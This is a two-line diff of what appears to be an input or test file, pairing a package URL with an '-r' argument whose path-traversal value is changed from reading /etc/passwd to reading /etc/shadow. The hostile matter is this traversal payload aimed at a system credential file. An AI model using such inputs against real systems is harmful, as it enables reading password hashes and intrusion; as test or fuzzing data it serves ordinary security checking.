@@ -1,2 +1,2 @@
 https://kranko.net/files/package.zip
--r ../../../../../../../../../etc/passwd
+-r ../../../../../../../../../etc/shadow
